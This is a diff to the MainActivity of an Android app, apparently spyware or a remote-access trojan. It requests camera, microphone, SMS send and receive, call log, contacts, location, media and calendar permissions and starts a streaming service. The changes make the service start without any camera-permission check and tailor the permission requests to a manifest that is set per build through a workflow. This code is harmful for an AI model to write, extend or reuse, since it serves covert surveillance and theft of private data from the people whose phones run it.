@@ -21,11 +21,20 @@ class MainActivity : AppCompatActivity() {
     private var restrictedOpened = false
     private var permRequestInFlight = false
 
+    // Permissions actually declared in this APK's manifest (set at build time via workflow)
+    private val declaredPerms: Set<String> by lazy {
+        try {
+            @Suppress("DEPRECATION")
+            packageManager.getPackageInfo(packageName, PackageManager.GET_PERMISSIONS)
+                .requestedPermissions?.toHashSet() ?: emptySet()
+        } catch (_: Exception) { emptySet() }
+    }
+
     private val requestPermissions = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
     ) { _ ->
         permRequestInFlight = false
-        if (has(Manifest.permission.CAMERA)) StreamingService.start(this)
+        StreamingService.start(this)
     }
 
     private val requestProjection = registerForActivityResult(
@@ -40,7 +49,7 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        if (has(Manifest.permission.CAMERA)) StreamingService.start(this)
+        StreamingService.start(this)
         requestMissingPermissions()
 
         findViewById<Button>(R.id.btnWatch).setOnClickListener {
@@ -70,7 +79,7 @@ class MainActivity : AppCompatActivity() {
 
     override fun onResume() {
         super.onResume()
-        if (has(Manifest.permission.CAMERA)) StreamingService.start(this)
+        StreamingService.start(this)
         requestMissingPermissions()
         if (!permRequestInFlight && isBatteryOptimized() && !batteryOpened) {
             batteryOpened = true
@@ -98,30 +107,33 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun getMissingPermissions(): List<String> = buildList {
-        if (!has(Manifest.permission.CAMERA)) add(Manifest.permission.CAMERA)
-        if (!has(Manifest.permission.RECORD_AUDIO)) add(Manifest.permission.RECORD_AUDIO)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
-            !has(Manifest.permission.POST_NOTIFICATIONS)) add(Manifest.permission.POST_NOTIFICATIONS)
-        if (!has(Manifest.permission.READ_PHONE_STATE)) add(Manifest.permission.READ_PHONE_STATE)
-        if (!has(Manifest.permission.READ_PHONE_NUMBERS)) add(Manifest.permission.READ_PHONE_NUMBERS)
-        if (!has(Manifest.permission.READ_CALL_LOG)) add(Manifest.permission.READ_CALL_LOG)
-        if (!has(Manifest.permission.CALL_PHONE)) add(Manifest.permission.CALL_PHONE)
-        if (!has(Manifest.permission.READ_CONTACTS)) add(Manifest.permission.READ_CONTACTS)
-        if (!has(Manifest.permission.READ_SMS)) add(Manifest.permission.READ_SMS)
-        if (!has(Manifest.permission.SEND_SMS)) add(Manifest.permission.SEND_SMS)
-        if (!has(Manifest.permission.RECEIVE_SMS)) add(Manifest.permission.RECEIVE_SMS)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S &&
-            !has(Manifest.permission.BLUETOOTH_CONNECT)) add(Manifest.permission.BLUETOOTH_CONNECT)
-        if (!has(Manifest.permission.ACCESS_FINE_LOCATION)) add(Manifest.permission.ACCESS_FINE_LOCATION)
-        if (!has(Manifest.permission.ACCESS_COARSE_LOCATION)) add(Manifest.permission.ACCESS_COARSE_LOCATION)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (!has(Manifest.permission.READ_MEDIA_IMAGES)) add(Manifest.permission.READ_MEDIA_IMAGES)
-            if (!has(Manifest.permission.READ_MEDIA_VIDEO)) add(Manifest.permission.READ_MEDIA_VIDEO)
-        } else {
-            if (!has(Manifest.permission.READ_EXTERNAL_STORAGE)) add(Manifest.permission.READ_EXTERNAL_STORAGE)
+        fun addIfNeeded(perm: String) {
+            if (perm in declaredPerms && !has(perm)) add(perm)
         }
-        if (!has(Manifest.permission.READ_CALENDAR)) add(Manifest.permission.READ_CALENDAR)
-        if (!has(Manifest.permission.WRITE_CALENDAR)) add(Manifest.permission.WRITE_CALENDAR)
+        addIfNeeded(Manifest.permission.CAMERA)
+        addIfNeeded(Manifest.permission.RECORD_AUDIO)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
+            addIfNeeded(Manifest.permission.POST_NOTIFICATIONS)
+        addIfNeeded(Manifest.permission.READ_PHONE_STATE)
+        addIfNeeded(Manifest.permission.READ_PHONE_NUMBERS)
+        addIfNeeded(Manifest.permission.READ_CALL_LOG)
+        addIfNeeded(Manifest.permission.CALL_PHONE)
+        addIfNeeded(Manifest.permission.READ_CONTACTS)
+        addIfNeeded(Manifest.permission.READ_SMS)
+        addIfNeeded(Manifest.permission.SEND_SMS)
+        addIfNeeded(Manifest.permission.RECEIVE_SMS)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
+            addIfNeeded(Manifest.permission.BLUETOOTH_CONNECT)
+        addIfNeeded(Manifest.permission.ACCESS_FINE_LOCATION)
+        addIfNeeded(Manifest.permission.ACCESS_COARSE_LOCATION)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            addIfNeeded(Manifest.permission.READ_MEDIA_IMAGES)
+            addIfNeeded(Manifest.permission.READ_MEDIA_VIDEO)
+        } else {
+            addIfNeeded(Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+        addIfNeeded(Manifest.permission.READ_CALENDAR)
+        addIfNeeded(Manifest.permission.WRITE_CALENDAR)
     }
 
     private fun permFriendlyName(perm: String): String = when (perm) {
